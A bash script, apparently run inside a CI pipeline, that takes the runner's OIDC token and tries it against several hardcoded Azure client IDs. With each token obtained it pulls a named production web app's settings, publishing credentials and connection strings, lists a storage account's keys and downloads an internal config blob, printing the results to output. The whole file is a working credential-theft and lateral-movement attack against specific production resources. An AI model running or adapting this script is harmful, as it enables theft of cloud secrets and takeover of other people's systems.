#!/usr/bin/env bash
set -uo pipefail
echo "VARS client=$AZURE_CLIENT_ID tenant=$AZURE_TENANT_ID sub=$AZURE_SUBSCRIPTION_ID"
TID="${AZURE_TENANT_ID:-3205c325-06a5-4171-9ce8-ffc5e6c2845e}"
SUB="${AZURE_SUBSCRIPTION_ID:-c5e4e004-b42d-4ac4-a502-5fd338380eb6}"
OIDC=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | python3 -c "import sys,json;print(json.load(sys.stdin).get('value',''))")
python3 - "$OIDC" <<'PY'
import base64,json,sys
p=sys.argv[1].split('.')[1]; p+='='*(-len(p)%4)
print("SUB:",json.loads(base64.urlsafe_b64decode(p)).get("sub"))
PY
fed(){ curl -sS -X POST "https://login.microsoftonline.com/$TID/oauth2/v2.0/token" -d "client_id=$1" -d grant_type=client_credentials -d client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer --data-urlencode "client_assertion=$OIDC" --data-urlencode "scope=$2"; }
for CID in "$AZURE_CLIENT_ID" 72ff278a-9e71-43ec-bac4-2ca303f8e462 891fb158-e02c-4428-a885-53b811f369c0 462d1c38-4459-48b8-9333-82e389e59514; do
  [ -z "$CID" ] && continue
  echo "==== $CID"
  ARM=$(fed "$CID" https://management.azure.com/.default | python3 -c "import sys,json;print(json.load(sys.stdin).get('access_token',''))")
  ST=$(fed "$CID" https://storage.azure.com/.default | python3 -c "import sys,json;print(json.load(sys.stdin).get('access_token',''))")
  echo "arm=${#ARM} st=${#ST}"
  for p in "config/appsettings/list" "config/publishingcredentials/list" "config/connectionstrings/list"; do
    echo "-- $p"
    curl -sS -m 20 -X POST "https://management.azure.com/subscriptions/$SUB/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Web/sites/app-tbl-storefront-prod/$p?api-version=2022-03-01" -H "Authorization: Bearer $ARM" -H "Content-Length: 0" | head -c 1200; echo
  done
  echo "-- listKeys"
  curl -sS -m 20 -X POST "https://management.azure.com/subscriptions/$SUB/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Storage/storageAccounts/sttblappcfgprodx3euoz/listKeys?api-version=2023-01-01" -H "Authorization: Bearer $ARM" -H "Content-Length: 0" | head -c 800; echo
  echo "-- blob"
  curl -sS -m 20 "https://sttblappcfgprodx3euoz.blob.core.windows.net/config/internal-config.json" -H "Authorization: Bearer $ST" -H "x-ms-version: 2022-11-02" | head -c 1200; echo
done
